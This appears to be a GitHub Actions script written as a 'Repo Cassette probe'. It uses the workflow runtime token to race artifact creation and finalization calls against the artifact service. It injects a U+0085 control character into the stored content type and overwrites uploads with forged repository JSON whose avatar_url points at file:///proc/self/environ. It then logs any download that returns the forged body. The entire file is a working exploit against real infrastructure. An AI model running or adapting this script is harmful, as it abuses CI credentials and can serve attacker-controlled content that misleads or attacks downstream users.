const crypto = require('node:crypto');

module.exports = async function scan({context}) {
  const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
  const resultsUrl = process.env.ACTIONS_RESULTS_URL;
  const claims = JSON.parse(Buffer.from(runtimeToken.split('.')[1], 'base64url').toString('utf8'));
  const scope = claims.scp.split(' ').find(x => x.startsWith('Actions.Results:'));
  const [, workflowRunBackendId, workflowJobRunBackendId] = scope.split(':');
  const ids = {workflow_run_backend_id: workflowRunBackendId, workflow_job_run_backend_id: workflowJobRunBackendId};
  const endpoint = `${new URL(resultsUrl).origin}/twirp/github.actions.results.api.v1.ArtifactService/`;
  const repo = `${context.repo.owner}/${context.repo.repo}`;
  const weird = '\u0085application/json';
  const safe = 'application/json';
  const cases = 64;

  async function twirp(method, body) {
    const response = await fetch(endpoint + method, {
      method: 'POST',
      headers: {'Authorization': `Bearer ${runtimeToken}`, 'Content-Type': 'application/json'},
      body: JSON.stringify(body),
    });
    return {status: response.status, data: await response.json().catch(() => ({}))};
  }
  async function upload(url, bytes) {
    const response = await fetch(url, {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/octet-stream',
        'x-ms-version': '2025-01-05',
        'x-ms-blob-type': 'BlockBlob',
        'x-ms-blob-content-type': weird,
      },
      body: bytes,
    });
    return response.status;
  }
  const payload = id => Buffer.from(JSON.stringify({
    full_name: `${repo}/actions/artifacts/${id}/zip`,
    owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
    description: 'Repo Cassette probe', stargazers_count: 0,
  }));
  for (let i = 0; i < cases; i++) {
    const name = `cassette-strong-${context.runId}-${i}`;
    const first = i % 2 ? [7, safe] : [6, weird];
    const second = i % 2 ? [6, weird] : [7, safe];
    try {
      const created = await Promise.all([first, second].map(([version, mime_type]) =>
        twirp('CreateArtifact', {...ids, name, version, mime_type})
      ));
      const urls = created.map(x => x.data.signed_upload_url || x.data.signedUploadUrl);
      if (created.some(x => x.status !== 200 || !x.data.ok) || urls.some(x => !x)) {
        console.log(JSON.stringify({pair:i,create:created.map(x => x.status),error:'create'}));
        continue;
      }
      const placeholder = Buffer.from('{"probe":"placeholder"}');
      const put = await Promise.all(urls.map(u => upload(u, placeholder)));
      if (put.some(x => x !== 201)) {
        console.log(JSON.stringify({pair:i,put,error:'upload'}));
        continue;
      }
      const hash = `sha256:${crypto.createHash('sha256').update(placeholder).digest('hex')}`;
      const finalized = await Promise.allSettled([0,1].map(() => twirp('FinalizeArtifact', {...ids, name, size:String(placeholder.length), hash})));
      const finalResponses = finalized.filter(x => x.status === 'fulfilled').map(x => x.value);
      const artifactIds = [...new Set(finalResponses.filter(x => x.status===200 && x.data.ok).map(x => String(x.data.artifact_id || x.data.artifactId)))];
      if (!artifactIds.length) {
        console.log(JSON.stringify({pair:i,final:finalResponses.map(x => x.status),error:'finalize'}));
        continue;
      }
      // Both create URLs are overwritten, as in the public reference workflow.
      for (const id of artifactIds) await Promise.all(urls.map(u => upload(u, payload(id))));
      const results = [];
      for (const id of artifactIds) {
        const rest = await fetch(`https://api.github.com/repos/${repo}/actions/artifacts/${id}/zip`, {
          redirect:'manual', headers:{'Authorization':`Bearer ${process.env.GH_TOKEN}`,'Accept':'application/vnd.github.v3+json'},
        });
        const location = rest.headers.get('location');
        const rsct = location ? new URL(location).searchParams.get('rsct') : null;
        let rawType=null,rawMatches=null,rawSha=null;
        if (location && rsct && (rsct.includes('\u0085') || rsct==='application/json')) {
          const raw = await fetch(location);
          rawType = raw.headers.get('content-type');
          const body = Buffer.from(await raw.arrayBuffer());
          rawSha = crypto.createHash('sha256').update(body).digest('hex');
          rawMatches = body.equals(payload(id));
        }
        results.push({id,rest:rest.status,rsct,rawType,rawMatches,rawSha});
      }
      console.log(JSON.stringify({pair:i,versions:[first[0],second[0]],create:created.map(x=>x.status),put,final:finalResponses.map(x=>x.status),results}));
      const winner = results.find(x => x.rawMatches && x.rawType?.includes('\u0085'));
      if (winner) {
        console.log(`POTENTIAL_WINNER ${JSON.stringify({name,pair:i,...winner,repository:`${repo}/actions/artifacts/${winner.id}/zip`})}`);
        return;
      }
    } catch (error) {
      console.log(JSON.stringify({pair:i,error:String(error).slice(0,220)}));
    }
  }
};
